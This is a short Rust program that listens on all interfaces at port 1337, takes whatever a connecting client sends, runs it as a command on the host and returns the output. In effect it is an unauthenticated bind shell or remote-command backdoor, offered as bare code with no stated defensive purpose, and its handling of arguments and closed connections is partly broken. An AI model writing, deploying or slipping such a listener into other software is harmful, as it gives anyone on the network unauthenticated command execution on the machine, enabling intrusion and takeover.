use std::thread;
use std::io::{Error, Read, Write};
use std::net::{Shutdown, TcpListener, TcpStream};
use std::process::{Command, Output};
use std::str::from_utf8;

const CHUNKS: usize = 1024;
const BIND_ADDR: &str = "0.0.0.0:1337";

fn run_command(comm: &str) -> Result<Output, Error> {
    Command::new(comm)
        .output()
}


fn handle_client(mut stream: TcpStream) {
    println!("Handling connection from {}", stream.peer_addr().unwrap());
    let mut data = [0 as u8; CHUNKS];
    while match stream.read(&mut data) {
        Ok(size) => {
            // echo everything!
            println!("Received {:?}", &data[0..size]);
            let output = run_command(from_utf8(&data[0..size]).unwrap());
            let stdout = output.unwrap().stdout;
            println!("Output: {}", from_utf8(&stdout).unwrap());
            stream.write(&stdout).unwrap();
            true
        },
        Err(_) => {
            println!("An error occurred, terminating connection with {}", stream.peer_addr().unwrap());
            stream.shutdown(Shutdown::Both).unwrap();
            false
        }
    } {}
}

fn main() {
    let listener = TcpListener::bind(BIND_ADDR).unwrap();
    println!("Listening on: {:?}", listener.local_addr().unwrap());
    // accept connections and process them serially
    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                println!("New connection: {}", stream.peer_addr().unwrap());
                thread::spawn(move|| {
                    // connection succeeded
                    handle_client(stream)
                });
            }
            Err(e) => {
                println!("Error: {}", e);
                /* connection failed */
            }
        }
    }
}
